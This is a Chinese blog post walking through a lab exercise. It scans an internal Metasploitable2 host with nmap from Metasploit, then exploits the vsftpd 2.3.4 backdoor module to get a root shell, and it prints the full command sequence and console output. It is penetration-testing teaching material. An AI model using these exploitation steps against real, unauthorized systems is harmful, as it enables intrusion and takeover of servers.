---
layout: post
category: binghe-code-hack
title: 使用Metasploit中的NMap插件扫描并渗透内网主机
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: 使用Metasploit中的NMap插件扫描并渗透内网主机
lock: need
---

# 使用Metasploit中的NMap插件扫描并渗透内网主机

攻击机： Kali 192.168.175.128

靶机： WinXP 192.168.175.130

内网主机： Metasploitable2 192.168.175.131

在上一篇《[Metasploit实战三之——使用Metasploit获取目标的控制权限](https://blog.csdn.net/l1028386804/article/details/86607498)》一文中，我们已经拿下了靶机的控制权限，并通过arp命令得知：内网中有一台IP为192.168.175.131的主机。接下来，我们首先使用NMap对这个主机进行扫描。

### 开启MSF终端

```
msfconsole
```

### 扫描内网主机

```
nmap -sV 192.168.175.131
```

结果如下：

```
msf5 > nmap -sV 192.168.175.131
[*] exec: nmap -sV 192.168.175.131

Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-23 12:28 CST
Nmap scan report for 192.168.175.131
Host is up (0.0029s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  rmiregistry GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 00:0C:29:CF:F6:AC (VMware)
Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.57 seconds
```

这里，我们利用 vsftpd 2.3.4的漏洞来攻破内网主机。

### 利用利用 vsftpd 2.3.4的漏洞来攻破内网主机

#### 搜索vsftpd 2.3.4漏洞

这里，使用search vsftpd 2.3.4命令，如下：

```
msf5 > search vsftpd 2.3.4

Matching Modules
================

   Name                                                      Disclosure Date  Rank       Check  Description
   ----                                                      ---------------  ----       -----  -----------
   auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials
   exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
   exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

#### 准备攻击

这里，我们依次输入以下命令：

```
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor 
show options
set RHOSTS 192.168.175.131
show payloads
set payload cmd/unix/interact 
exploit
```

具体如下：

```
msf5 > search vsftpd 2.3.4

Matching Modules
================

   Name                                                      Disclosure Date  Rank       Check  Description
   ----                                                      ---------------  ----       -----  -----------
   auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials
   exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
   exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 > use exploit/unix/ftp/vsftpd_234_backdoor 
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.175.131
RHOSTS => 192.168.175.131
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show payloads

Compatible Payloads
===================

   Name               Disclosure Date  Rank    Check  Description
   ----               ---------------  ----    -----  -----------
   cmd/unix/interact                   normal  No     Unix Command, Interact with Established Connection

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact 
payload => cmd/unix/interact
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.175.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.175.131:21 - USER: 331 Please specify the password.
[+] 192.168.175.131:21 - Backdoor service has been spawned, handling...
[+] 192.168.175.131:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.175.128:44413 -> 192.168.175.131:6200) at 2019-01-23 14:00:16 +0800

ifconfig
eth0      Link encap:Ethernet  HWaddr 00:0c:29:cf:f6:ac  
          inet addr:192.168.175.131  Bcast:192.168.175.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fecf:f6ac/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:5408 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2778 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:368033 (359.4 KB)  TX bytes:249606 (243.7 KB)
          Interrupt:19 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:766 errors:0 dropped:0 overruns:0 frame:0
          TX packets:766 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:349561 (341.3 KB)  TX bytes:349561 (341.3 KB)
```

这样，我们就通过NMap扫描目标主机，并通过Metasploit攻击vsftpd 2.3.4漏洞拿下了内网服务器的权限。

## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)